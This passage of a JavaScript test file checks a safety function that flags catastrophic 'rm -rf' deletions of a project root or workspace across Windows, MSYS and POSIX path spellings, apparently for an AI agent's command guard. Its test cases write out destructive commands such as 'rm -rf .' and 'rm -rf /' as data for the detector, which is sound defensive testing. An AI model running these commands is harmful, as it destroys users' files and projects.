    { name: 'native cd to the project root then delete cwd', command: 'cd D:\\a\\juggler\\juggler && rm -rf .', expected: true },
    { name: 'case-insensitive spelling of the project root', command: 'rm -rf d:\\A\\JUGGLER\\juggler', expected: true },
    // A subdir of the project stays the reviewer's call, in every spelling.
    { name: 'native subdir of the project', command: `rm -rf ${WIN_ROOT}\\web`, expected: false },
    { name: 'MSYS subdir of the project', command: 'rm -rf /d/a/juggler/juggler/web', expected: false },
    // An escaped space is an escaped space: the word is one filename, not two
    // segments, and `my/ files` is not a tree anyone has.
    { name: 'escaped space is not a path separator', command: 'rm -rf my\\ files', expected: false },
    { name: 'relative build dir from the workspace cwd', command: 'rm -rf ./build', expected: false, cwd: '/tmp/work-tree' },
    // The workspace the conversation works in is the other protected tree; the
    // floor is asked once per tree, so a POSIX cwd and a native root coexist.
    { name: 'deleting the cwd when it is the protected root', command: 'rm -rf .', expected: true, cwd: '/tmp/work-tree', root: '/tmp/work-tree' },
  ];
  for (const c of WINDOWS_CATASTROPHIC_CASES) {
    try {
      const got = isCatastrophicDeletion(c.command, {
        platform: 'windows', home: WIN_HOME, projectRoot: c.root || WIN_ROOT, cwd: c.cwd || '/tmp/work-tree'
      });
      if (got !== c.expected) {
        failed++;
        errors.push(`catastrophic-windows/${c.name}: want ${c.expected} for "${c.command}", got ${got}`);
      } else passed++;
    } catch (e) {
      failed++;
      errors.push(`catastrophic-windows/${c.name}: threw ${e instanceof Error ? e.message : String(e)}`);
    }
  }

  // No project root known → nothing to protect, always false (even for `rm -rf /`).
  {
    const got = isCatastrophicDeletion('rm -rf /', { platform: 'linux', home: CATASTROPHIC_HOME, projectRoot: '' });
    if (got !== false) { failed++; errors.push(`catastrophic/no-root: want false with empty projectRoot, got ${got}`); }
    else passed++;
  }

  return { passed, failed, errors };
}
